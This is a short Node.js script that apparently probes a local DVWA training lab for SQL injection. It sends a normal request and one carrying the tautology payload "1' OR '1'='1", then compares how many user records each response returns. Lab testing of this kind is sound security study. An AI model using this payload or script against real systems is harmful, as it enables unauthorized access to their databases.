const axios = require('axios');

async function checkContent() {
  const cookies = 'PHPSESSID=lforop4bmja8onpsut6kjk8655; security=low';
  const baseUrl = 'http://localhost:8080/vulnerabilities/sqli/';
  
  // Normal request
  const normal = await axios.get(baseUrl, {
    params: { id: '1', Submit: 'Submit' },
    headers: { Cookie: cookies }
  });
  
  // SQLi request
  const sqli = await axios.get(baseUrl, {
    params: { id: "1' OR '1'='1", Submit: 'Submit' },
    headers: { Cookie: cookies }
  });
  
  console.log('Normal response contains "admin":', normal.data.includes('admin'));
  console.log('SQLi response contains "admin":', sqli.data.includes('admin'));
  
  console.log('\nNormal response contains "First name":', normal.data.includes('First name'));
  console.log('SQLi response contains "First name":', sqli.data.includes('First name'));
  
  // Extract the actual results
  const normalMatch = normal.data.match(/First name:.*?<br \/>/s);
  const sqliMatch = sqli.data.match(/First name:.*?<br \/>/gs);
  
  console.log('\nNormal query returns:', normalMatch ? normalMatch.length : 0, 'results');
  console.log('SQLi query returns:', sqliMatch ? sqliMatch.length : 0, 'results');
  
  console.log('\n--- Normal Response Sample ---');
  console.log(normal.data.substring(normal.data.indexOf('First name'), normal.data.indexOf('First name') + 200));
  
  console.log('\n--- SQLi Response Sample ---');
  console.log(sqli.data.substring(sqli.data.indexOf('First name'), sqli.data.indexOf('First name') + 500));
}

checkContent().catch(err => console.error('Error:', err.message));
